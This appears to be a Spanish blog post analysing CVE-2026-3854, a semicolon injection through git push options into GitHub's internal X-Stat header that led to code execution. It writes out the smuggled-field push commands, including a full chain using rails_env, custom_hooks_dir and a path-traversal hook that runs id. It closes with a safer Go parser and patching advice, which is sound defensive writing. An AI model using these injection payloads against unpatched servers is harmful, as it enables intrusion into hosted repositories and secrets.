@@ -1,0 +1,196 @@
+---
+title: "RCE en GitHub.com: bastó un solo git push"
+date: "2026-04-29T06:00"
+tags: ["seguridad", "github", "cve", "rce", "git"]
+excerpt: "Wiz Research descubrió CVE-2026-3854: una inyección en la cabecera X-Stat de GitHub permitía ejecutar código en GitHub.com con un simple git push."
+---
+
+El 28 de abril de 2026, el equipo de Wiz Research publicó los detalles de una vulnerabilidad que me dejó sin aliento. **CVE-2026-3854** (CVSS 8.7) permitía a cualquier usuario autenticado de GitHub ejecutar comandos arbitrarios en la infraestructura interna de GitHub.com usando únicamente un cliente git estándar. Sin exploits complejos, sin herramientas especiales. Solo `git push`.
+
+La magnitud es difícil de exagerar: estamos hablando de la plataforma que aloja cientos de millones de repositorios, desde proyectos open source hasta codebases empresariales. Y el vector de ataque eran los *push options*, una funcionalidad legítima del protocolo Git que probablemente usas sin saberlo.
+
+## La arquitectura del push en GitHub
+
+Cuando haces `git push` contra GitHub por SSH, tu código no va directo a un repositorio. Atraviesa una cadena de servicios internos, cada uno escrito en un lenguaje distinto:
+
+- **babeld** — el proxy de entrada. Recibe tu conexión SSH y reenvía la autenticación a gitauth.
+- **gitauth** — verifica credenciales, permisos de push y devuelve políticas de seguridad (límites de tamaño de archivo, reglas de nombres de rama...).
+- **gitrpcd** — servidor RPC interno que recibe la petición de babeld, parsea la cabecera `X-Stat` y prepara el entorno para downstream.
+- **El binario pre-receive** — un ejecutable compilado en Go que aplica las políticas de seguridad antes de aceptar el push.
+
+El pegamento entre estos servicios es la cabecera **X-Stat**: un formato interno de pares `clave=valor` separados por punto y coma que transporta metadatos de seguridad críticos. Algo así conceptualmente:
+
+```
+X-Stat: large_blob_rejection_enabled=bool:true;push_option_count=1;push_option_0=mis-datos;rails_env=production
+```
+
+El detalle fatal: gitrpcd **confía ciegamente** en babeld. No hace su propia autenticación. Cada campo del X-Stat se trata como autoritativo.
+
+## El fallo: punto y coma sin escapar
+
+Los *push options* son cadenas arbitrarias que pasas con `git push -o`. Sirven para pasar pistas al servidor, tipo "ejecuta CI con estos parámetros". babeld las mete directamente en la cabecera X-Stat como campos numerados.
+
+Y aquí viene el desastre: **babeld no sanitiza los punto y coma**.
+
+Como `;` es el delimitador del X-Stat, cualquier `;` dentro de un push option rompe el campo y crea campos nuevos controlados por el atacante. Y el parser usa semántica *last-write-wins*: si una clave aparece dos veces, el último valor sobreescribe silenciosamente al primero.
+
+Veámoslo con un ejemplo simplificado. Imagina que haces:
+
+```bash
+git push -o "datos;large_blob_rejection_enabled=bool:false" origin main
+```
+
+babeld construye algo como:
+
+```
+X-Stat: large_blob_rejection_enabled=bool:true;push_option_0=datos;large_blob_rejection_enabled=bool:false;push_option_count=1
+```
+
+Al parsear por `;`, el mapa resultante es:
+
+```
+large_blob_rejection_enabled = bool:false  ← INYECTADO (sobrescribe el bool:true original)
+push_option_0                = datos
+push_option_count            = 1
+```
+
+El atacante acaba de desactivar la comprobación de tamaño de archivos. Con un solo push. Y esto era solo el aperitivo.
+
+## De inyección a ejecución de código
+
+Wiz identificó tres campos inyectables que, encadenados, llevaban a RCE:
+
+| Campo | Función |
+|---|---|
+| `rails_env` | Controla si los hooks se ejecutan en sandbox (`production`) o directamente |
+| `custom_hooks_dir` | Directorio base para buscar scripts de hooks |
+| `repo_pre_receive_hooks` | Definición JSON de hooks pre-receive a ejecutar |
+
+El binario pre-receive tiene dos caminos de ejecución para hooks personalizados. Con `rails_env=production` (el valor legítimo), los hooks corren dentro de un sandbox. Con **cualquier otro valor**, los hooks se ejecutan directamente, sin aislamiento, como el usuario `git` del sistema.
+
+Y como podemos inyectar `rails_env`, podemos elegir el camino sin sandbox.
+
+La cadena de explotación completa:
+
+**Paso 1** — Inyectar `rails_env=dev` para saltar al camino sin sandbox.
+
+**Paso 2** — Inyectar `custom_hooks_dir=/tmp` para controlar dónde busca hooks el binario.
+
+**Paso 3** — Inyectar `repo_pre_receive_hooks` con un payload JSON que contiene un path traversal hacia un binario del sistema.
+
+El binario pre-receive resuelve la ruta concatenando el directorio base (controlado por el atacante) con el path traversal del hook, apuntando a un ejecutable real del sistema. Luego lo ejecuta directamente.
+
+Así se vería conceptualmente el payload JSON malicioso dentro de la cabecera:
+
+```json
+[
+  {
+    "name": "exploit",
+    "script": "../../usr/bin/id",
+    "enabled": true
+  }
+]
+```
+
+El resultado, con un solo comando:
+
+```bash
+git push -o "rails_env=dev;custom_hooks_dir=/tmp;repo_pre_receive_hooks=[{\"name\":\"x\",\"script\":\"../../usr/bin/id\",\"enabled\":true}]" origin main
+```
+
+Y en la salida del push:
+
+```
+remote: uid=500(git) gid=500(git) groups=500(git)
+```
+
+RCE confirmada. En GitHub Enterprise Server, esto daba control total del servidor incluyendo acceso a todos los repositorios alojados y secretos internos.
+
+## ¿Y GitHub.com?
+
+Aquí la historia se pone aún más interesante. La primera prueba contra GitHub.com **no funcionó**. Los hooks maliciosos simplemente no se ejecutaban.
+
+Wiz inyectó entonces `user_operator_mode=bool:true` para activar salida de depuración en ambas plataformas. Comparando lado a lado, vieron que en GitHub.com faltaban ciertos pasos de ejecución de hooks. El camino de código simplemente no se alcanzaba.
+
+Excavando más en el binario, encontraron un flag booleano en el X-Stat que controla si el servidor opera en modo enterprise. En GHES vale `true` por defecto. En GitHub.com vale `false`.
+
+Era inyectable.
+
+Un campo más en el push option, y la cadena completa funcionó contra GitHub.com:
+
+```
+remote: ██████████████████████████.github.net
+```
+
+Dentro de la infraestructura de GitHub.com. Como el usuario `git`, que tiene acceso de lectura a **todos** los repositorios del nodo de almacenamiento compartido donde aterrizas. Millones de repositorios públicos y privados, de otros usuarios y organizaciones, accesibles desde esa posición.
+
+Wiz confirmó el acceso cross-tenant solo con sus cuentas de prueba, sin leer contenido de otros. Pero el impacto potencial es escalofriante.
+
+## Cómo defenderse del patrón, no solo del bug
+
+Más allá del CVE concreto, esta vulnerabilidad es una clase magistral sobre un patrón que se repite en muchas arquitecturas multi-servicio. El problema de fondo no es un simple "sanitizar inputs". Es una cadena de confianza rota:
+
+1. **Un servicio confía en que los push options no contienen delimitadores.** Falso.
+2. **Otro servicio confía en que cada campo del X-Stat viene de una fuente confiable.** Falso.
+3. **Un binario confía en que `rails_env` solo puede valer `production` en producción.** Falso.
+
+Cada suposición era razonable aisladamente. Juntas, eran una autopista al desastre.
+
+La lección práctica para quienes construimos sistemas multi-servicio:
+
+```go
+// MAL: parseo ingenuo con split por delimitador
+func parseXStat(header string) map[string]string {
+    result := make(map[string]string)
+    for _, pair := range strings.Split(header, ";") {
+        parts := strings.SplitN(pair, "=", 2)
+        if len(parts) == 2 {
+            result[parts[0]] = parts[1]  // last-write-wins sin validación
+        }
+    }
+    return result
+}
+
+// MEJOR: validar que las claves son las esperadas
+var allowedKeys = map[string]bool{
+    "large_blob_rejection_enabled": true,
+    "push_option_count":            true,
+    "rails_env":                    true,
+    // ...
+}
+
+func parseXStatSafe(header string) (map[string]string, error) {
+    result := make(map[string]string)
+    for _, pair := range strings.Split(header, ";") {
+        parts := strings.SplitN(pair, "=", 2)
+        if len(parts) != 2 {
+            continue
+        }
+        key := parts[0]
+        if !allowedKeys[key] {
+            continue  // ignorar claves no esperadas
+        }
+        if _, exists := result[key]; exists {
+            return nil, fmt.Errorf("clave duplicada: %s", key)
+        }
+        result[key] = parts[1]
+    }
+    return result, nil
+}
+```
+
+La diferencia entre ambos es la diferencia entre un CVE 8.7 y una noche tranquila.
+
+## Mi veredicto
+
+Hay varias cosas que me parecen notables de este caso.
+
+**Primero**, la velocidad de respuesta de GitHub. Wiz reportó la vulnerabilidad el 4 de marzo de 2026. Ese mismo día GitHub desplegó el fix en GitHub.com. **Seis horas**. Para un parche en infraestructura crítica que procesa millones de pushes diarios, es un tiempo de respuesta sobresaliente.
+
+**Segundo**, el papel de la IA en el descubrimiento. Wiz usó IDA MCP —herramientas de reverse engineering aumentadas con IA— para analizar binarios compilados que antes requerían un esfuerzo manual prohibitivo. Esto es una señal de hacia dónde va la investigación de seguridad: lo que antes era "demasiado caro de auditar" cada vez lo es menos. Los binarios cerrados ya no son una barrera efectiva.
+
+**Tercero**, la cifra que más me preocupa: **88% de las instancias de GHES siguen vulnerables** en el momento de escribir esto. El parche existe desde el 10 de marzo. Han pasado casi dos meses. Si administras una instancia de GitHub Enterprise Server, no es broma: actualiza ya.
+
+**Y cuarto**, esto me hace reflexionar sobre cuántas cabeceras internas, protocolos propietarios y formatos ad-hoc hay en la infraestructura que usamos a diario, esperando su momento para convertirse en el próximo CVE. El X-Stat de GitHub es solo uno. ¿Cuántos más hay en Kubernetes, en los CDNs, en las plataformas cloud que damos por sentadas?
+
+La respuesta, como casi siempre en seguridad, es incómoda.
